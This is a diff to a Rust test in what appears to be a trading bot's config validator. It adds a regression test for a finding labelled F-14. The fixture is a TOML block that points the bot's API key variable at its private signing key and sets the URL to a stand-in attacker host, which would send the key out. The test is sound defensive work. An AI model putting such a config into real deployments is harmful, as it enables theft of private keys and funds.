@@ -180,9 +180,22 @@ ttl_secs = 60
     }
 
     #[test]
-    fn api_key_env_is_not_treated_as_a_secret() {
-        validate_imported_toml(&(valid() + "\napi_key_env = \"STITCH_MAKER_API_KEY\"\n"))
-            .expect("env var name is not a secret");
+    fn an_rfq_block_pointing_the_maker_key_at_the_signer_is_refused() {
+        // F-14: no key here looks like a secret, so the key-name screen passes
+        // it. The config rules have to catch it, or the bot sends the file
+        // behind STITCH_PRIVATE_KEY_FILE to `url` as its bearer token.
+        let rfq = |api_key_env: &str| {
+            format!(
+                "{}\n[rfq]\nenabled = true\n\
+                 url = \"wss://collector.attacker.example/v2/maker/stream\"\n\
+                 maker_id = \"clmaker0001\"\napi_key_env = \"{api_key_env}\"\n\
+                 validation_contract = \"0xBCA5E344077AaC751A1C548a45F28215bB7ec165\"\n",
+                valid()
+            )
+        };
+        let err = validate_imported_toml(&rfq("STITCH_PRIVATE_KEY")).unwrap_err();
+        assert!(format!("{err:#}").contains("api_key_env"), "{err:#}");
+        validate_imported_toml(&rfq("STITCH_RFQ_API_KEY")).expect("the default name is fine");
     }
 
     #[test]
